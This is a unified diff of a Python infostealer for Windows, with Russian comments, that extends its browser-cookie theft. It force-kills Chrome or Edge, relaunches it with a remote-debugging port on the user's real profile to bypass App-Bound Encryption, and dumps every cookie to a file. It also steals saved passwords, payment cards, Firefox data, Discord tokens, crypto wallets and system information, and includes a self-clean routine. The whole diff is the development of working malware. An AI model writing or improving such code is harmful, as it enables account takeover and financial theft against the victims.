@@ -42,7 +42,7 @@ def dpapi_dec(data: bytes):
         return None
 
 # ============================================================
-# AES-GCM через pycryptodome (для v10/v11)
+# AES-GCM через pycryptodome (v10/v11)
 # ============================================================
 def aes_gcm_decrypt(key: bytes, nonce: bytes, ct: bytes, tag: bytes):
     try:
@@ -111,9 +111,9 @@ def copy_shared(src: Path, dst: Path) -> bool:
     return False
 
 # ============================================================
-# Chrome DevTools Protocol (обход v20 App-Bound Encryption)
+# Chrome DevTools Protocol (обход v20)
 # ============================================================
-def steal_cookies_cdp(browser_name, port):
+def steal_cookies_cdp(browser_name, port, user_data_dir):
     if browser_name == "Chrome":
         paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                  r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
@@ -126,35 +126,44 @@ def steal_cookies_cdp(browser_name, port):
         return False
 
     exe_path = next((p for p in paths if os.path.exists(p)), None)
-    if not exe_path: return False
+    if not exe_path:
+        print(f"[CDP {browser_name}] exe not found")
+        return False
     exe_name = os.path.basename(exe_path)
 
-    # 1. Убиваем браузер
     subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
     time.sleep(2)
 
-    # 2. Запускаем с отладкой
+    args = [
+        exe_path,
+        f"--remote-debugging-port={port}",
+        "--remote-allow-origins=*",
+        f"--user-data-dir={user_data_dir}",
+        "--no-first-run",
+        "--no-default-browser-check",
+        "--disable-gpu",
+    ]
     try:
-        subprocess.Popen([exe_path, f"--remote-debugging-port={port}", "--headless=new"],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception:
+        subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        print(f"[CDP {browser_name}] start err: {e}")
         return False
 
-    # 3. Ждём CDP
     ws_url = None
-    for _ in range(15):
+    for i in range(20):
         try:
             resp = urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version", timeout=2)
             ws_url = json.loads(resp.read())["webSocketDebuggerUrl"]
+            print(f"[CDP {browser_name}] CDP up after {i+1}s")
             break
         except Exception:
             time.sleep(1)
 
     if not ws_url:
+        print(f"[CDP {browser_name}] CDP not up")
         subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True)
         return False
 
-    # 4. Подключаемся и запрашиваем куки
     cookies = []
     try:
         ws = websocket.create_connection(ws_url, timeout=10)
@@ -162,22 +171,17 @@ def steal_cookies_cdp(browser_name, port):
         result = json.loads(ws.recv())
         cookies = result.get("result", {}).get("cookies", [])
         ws.close()
-    except Exception:
-        pass
+        print(f"[CDP {browser_name}] got {len(cookies)} cookies")
+    except Exception as e:
+        print(f"[CDP {browser_name}] ws err: {e}")
 
-    # 5. Убиваем браузер (оставляем мертвым для steal_chromium)
     subprocess.run(["taskkill", "/IM", exe_name, "/F"], capture_output=True, timeout=10)
     time.sleep(1)
 
-    # 6. Сохраняем
     if cookies:
         with (OUT / f"{browser_name}_CDP_cookies.txt").open("w", encoding="utf-8") as f:
             for c in cookies:
-                domain = c.get("domain", "")
-                name = c.get("name", "")
-                value = c.get("value", "")
-                path = c.get("path", "/")
-                f.write(f"{domain}\t{name}\t{value}\t{path}\n")
+                f.write(f"{c.get('domain','')}\t{c.get('name','')}\t{c.get('value','')}\t{c.get('path','/')}\n")
         return True
     return False
 
@@ -208,7 +212,7 @@ def reopen_browsers():
             time.sleep(1)
 
 # ============================================================
-# Chromium (пароли, карты, старые куки)
+# Chromium (пароли, карты)
 # ============================================================
 CHROMIUM = {
     "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
@@ -302,7 +306,7 @@ def steal_firefox():
                     safe(tmp.unlink)
 
 # ============================================================
-# Discord tokens — все файлы leveldb, все кодировки
+# Discord tokens
 # ============================================================
 def steal_discord():
     pats = [
@@ -353,7 +357,7 @@ def steal_wallets():
             safe(shutil.copy2, src, dst)
 
 # ============================================================
-# Sysinfo (cp866) + hostinfo fallback
+# Sysinfo + hostinfo
 # ============================================================
 SYSINFO = {
     "hostname":  "hostname",
@@ -448,12 +452,14 @@ def self_clean():
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
     safe(close_browsers)
-    
+
     # CDP для Chrome и Edge (обход v20)
-    safe(steal_cookies_cdp, "Chrome", 9222)
-    safe(steal_cookies_cdp, "Edge", 9223)
-    
-    # Пароли и карты (браузеры мертвы, локов нет)
+    chrome_ud = str(CHROMIUM["Chrome"])
+    edge_ud   = str(CHROMIUM["Edge"])
+    safe(steal_cookies_cdp, "Chrome", 9222, chrome_ud)
+    safe(steal_cookies_cdp, "Edge",   9223, edge_ud)
+
+    # Пароли и карты через copy_shared (браузеры мертвы, локов нет)
     for n, ud in CHROMIUM.items():
         safe(steal_chromium, n, ud)
     safe(steal_firefox)
